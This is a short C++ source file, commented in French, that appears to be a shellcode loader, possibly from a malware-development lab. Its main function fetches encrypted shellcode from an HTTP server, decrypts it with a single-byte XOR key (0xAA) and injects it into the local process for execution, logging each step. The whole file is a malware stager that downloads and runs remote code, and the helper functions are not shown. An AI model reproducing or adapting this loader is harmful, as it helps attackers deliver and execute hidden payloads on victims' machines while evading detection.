#include <iostream> 
#include "HTTPClient.h" 
#include "Decrypt.h" 
#include "Memory.h" 

int main() {
    // Etape 2 : Récupération du shellcode chiffré du serveur HTTP 
    DWORD payloadSize = 0;
    PBYTE payload = getHTTPPayload(payloadSize);

    if (!payload) {
        std::cerr << "Échec de la récupération du shellcode." << std::endl;
        return 1;
    }

    std::cout << "Shellcode récupéré (chiffré) :" << std::endl;

    for (DWORD i = 0; i < payloadSize; i++) {
        printf("%02X ", payload[i]);
    }

    std::cout << std::endl;

    

    // Fin de la récupération du shellcode chiffré du serveur http
    
    // Etape 3 : Déchiffrement du shellcode 
     // Clé de déchiffrement 

    unsigned char decryptionKey = 0xAA;

    // Déchiffrement du shellcode 

    decrypt(payload, payloadSize, decryptionKey);

    std::cout << "Shellcode après déchiffrement :" << std::endl;

    for (DWORD i = 0; i < payloadSize; i++) {
        printf("%02X ", payload[i]);
    }

    std::cout << std::endl;

    // Fin du déchiffrement du shellcode 

     // Etape 4 : Injection du shellcode
    if (!injectShellcodeLocal(payload, payloadSize)) {
        std::cerr << "Échec de l'injection du shellcode." << std::endl;
        LocalFree(payload);
        return 1;
    }

    std::cout << "Injection réussie !" << std::endl;

    // Fin de l'injection du shellcode

    LocalFree(payload);
    return 0;
}